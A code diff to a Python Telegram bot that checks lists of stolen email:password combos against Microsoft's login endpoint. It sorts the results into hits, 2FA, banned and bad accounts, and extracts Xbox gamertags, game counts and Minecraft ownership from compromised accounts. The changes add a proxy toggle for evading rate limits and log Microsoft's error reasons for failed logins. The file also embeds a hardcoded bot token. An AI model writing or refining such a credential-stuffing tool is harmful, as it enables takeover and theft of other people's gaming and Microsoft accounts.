@@ -22,6 +22,9 @@ from aiogram.client.default import DefaultBotProperties
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
 
+# SET THIS TO FALSE TO USE RENDER'S CLEAN IP (True to use the free list)
+USE_PROXIES = False 
+
 MAX_CONCURRENT = 20
 TIMEOUT = 25
 TEMP_DIR = "./temp"
@@ -45,6 +48,7 @@ os.makedirs(TEMP_DIR, exist_ok=True)
 # PROXY FETCHER
 # ============================================================
 async def fetch_proxies() -> list:
+    if not USE_PROXIES: return []
     url = "https://freeproxiesbyvortex.lovable.app/proxies"
     proxies = []
     try:
@@ -64,7 +68,7 @@ async def fetch_proxies() -> list:
 
 PROXIES = []
 def pick_proxy():
-    if PROXIES:
+    if PROXIES and USE_PROXIES:
         return random.choice(PROXIES)
     return None
 
@@ -105,12 +109,22 @@ async def ms_ropc(session, email, password):
         async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             body = await r.text()
             if r.status == 200: return {"ok": True, "data": await r.json()}
+            
+            # Grab the exact error message from Microsoft
+            err_msg = ""
+            try:
+                err_json = await r.json()
+                err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
+            except:
+                err_msg = body[:50]
+
             low = body.lower()
             if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
             if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
             if r.status == 429: return {"ok": False, "kind": "RATE"}
-            return {"ok": False, "kind": "BAD"}
-    except Exception: return {"ok": False, "kind": "ERR"}
+            return {"ok": False, "kind": "BAD", "detail": err_msg}
+            
+    except Exception as e: return {"ok": False, "kind": "ERR", "detail": str(e)}
 
 async def xbox_user_auth(session, ms_access):
     payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={ms_access}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
@@ -174,6 +188,7 @@ async def check_account(session, email, password):
     ropc = await ms_ropc(session, email, password)
     if not ropc["ok"]:
         result["status"] = ropc["kind"]
+        result["detail"] = ropc.get("detail", "")
         return result
     result["status"] = "HIT"
     ms_access = ropc["data"].get("access_token", "")
@@ -232,10 +247,14 @@ async def process_combos(combos, chat_id, status_msg, bot):
         with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))
 
     write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
-    write_file("bad.txt", [f"{r['email']}:{r['password']}" for r in bad])
+    
+    # This is the important part: write WHY it went bad
+    write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
+    
     write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
     write_file("banned.txt", [f"{r['email']}:{r['password']}" for r in banned])
-    write_file("errors.txt", [f"{r['email']}:{r['password']}" for r in errors])
+    write_file("errors.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in errors])
+    
     write_file("xbox_games.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['games']} games" for r in hits if r["games"] > 0])
     write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r["minecraft"]])
     
@@ -252,7 +271,6 @@ async def process_combos(combos, chat_id, status_msg, bot):
     try: os.remove(zip_path)
     except: pass
 
-# Proper aiogram 3.7+ initialization
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
@@ -297,14 +315,12 @@ async def web_server():
     log.info(f"Web server started on port {port}")
 
 async def main():
-    # Start web server instantly so Render sees the port open
     asyncio.create_task(web_server())
     
     global PROXIES
     PROXIES = await fetch_proxies()
     log.info(f"starting | proxies={len(PROXIES)}")
     
-    # Start the bot
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
